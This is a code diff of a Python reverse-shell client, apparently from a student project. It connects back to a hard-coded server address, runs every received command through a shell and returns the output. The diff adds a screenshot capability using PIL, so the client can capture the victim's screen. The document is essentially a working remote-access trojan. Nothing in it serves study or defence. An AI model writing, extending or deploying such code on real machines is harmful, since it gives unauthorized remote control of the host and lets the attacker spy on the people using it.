@@ -1,6 +1,14 @@
 import socket 
 import os
 import subprocess
+from PIL import ImageGrab
+
+
+def screenshot():
+    screen = ImageGrab.grab()
+    screen.save("screen.png")
+    screen.show()
+    screen.close()
 
 
 host = '10.1.162.188' # change that to the IP address of the server
@@ -17,13 +25,22 @@ while True:
         os.chdir(data[3:].decode("utf-8"))
             
     if len(data) > 0: 
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # get trough the standard input, output and error
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte, "utf-8")
-        s.send(str.encode(output_str + str(os.getcwd) + '> '))
-        
-        # TO DELETE BEFORE DEADLINE
-        print (output_str) # print the output of the command on the client machine
+
+        data = data.decode("utf-8")
+
+        if data == 'screenshot':
+            screenshot()
+            print("Screenshot taken")
+
+        else:
+            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # get trough the standard input, output and error
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte, "utf-8")
+
+            s.send(str.encode(output_str + str(os.getcwd) + '> '))
+            
+            # TO DELETE BEFORE DEADLINE
+            print (output_str) # print the output of the command on the client machine
 
 
 # if we get out of the loop, we close the connection
